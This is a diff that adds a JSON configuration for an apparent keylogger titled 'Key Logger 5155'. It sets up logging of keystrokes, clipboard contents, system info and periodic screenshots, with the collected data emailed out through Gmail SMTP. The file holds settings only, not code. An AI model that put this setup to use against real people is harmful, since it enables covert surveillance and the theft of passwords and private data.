@@ -1,0 +1,33 @@
+{
+  "paths": {
+    "data_dir": "data",
+    "keys_file": "data/key_log.txt",
+    "system_file": "data/systeminfo.txt",
+    "clipboard_file": "data/clipboard.txt",
+    "screenshot_dir": "data/screenshots"
+  },
+  "intervals_seconds": {
+    "screenshot_interval": 900,
+    "email_interval": 900,
+    "clipboard_interval": 30,
+    "loop_sleep": 1
+  },
+  "screenshots": {
+    "keep_latest": 10
+  },
+  "email": {
+    "smtp_host": "smtp.gmail.com",
+    "smtp_port": 587,
+    "from_env": true,
+    "from_address_env_var": "email",
+    "from_password_env_var": "pass"
+  },
+  "gui": {
+    "icon": "cracking.ico",
+    "image": "cracking.png",
+    "window_title": "Key Logger 5155"
+  },
+  "safety": {
+    "require_confirm": true
+  }
+}
